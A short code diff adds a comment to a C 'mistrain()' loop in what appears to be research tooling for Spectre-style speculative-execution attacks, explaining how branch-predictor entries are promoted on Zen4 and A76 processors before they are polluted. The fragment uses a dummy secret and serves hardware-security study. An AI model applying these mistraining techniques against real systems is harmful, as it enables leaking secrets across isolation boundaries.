@@ -160,6 +160,12 @@ void mistrain()
     for (int j = 0; j < mistrain_passes; j++)
     {
         #if !defined(DBG_MISTRAIN_NO_BTB_PROMOTE)
+        /**
+         * On Zen4 and A76 processors, we observed that before the targeted BTB/PHT entry can be effectively polluted or evicted,
+         * the mistraining branches must first be *activated* by executing them repeatedly with alternating outcomes. 
+         * This promotes the relevant entries into higher-level BTB structures. 
+         * We enable this behavior by default, but it can be disabled by setting the DBG_MISTRAIN_NO_BTB_PROMOTE flag.
+         */
         goto_chain(tramp_bcond->jit_mem->call_entry, bh_args_mistrain[i], &ib_ptr_empty, args.nr_for_bh, frbuf, DUMMY_SECRET_P, 1, (char**)argv_bcond_tt);
         goto_chain(tramp_bcond->jit_mem->call_entry, bh_args_mistrain[i], &ib_ptr_empty, args.nr_for_bh, frbuf, DUMMY_SECRET_P, 1, (char**)argv_bcond_nt);
         goto_chain(tramp_bcond->jit_mem->call_entry, bh_args_mistrain[i], &ib_ptr_empty, args.nr_for_bh, frbuf, DUMMY_SECRET_P, 1, (char**)argv_bcond_tt);
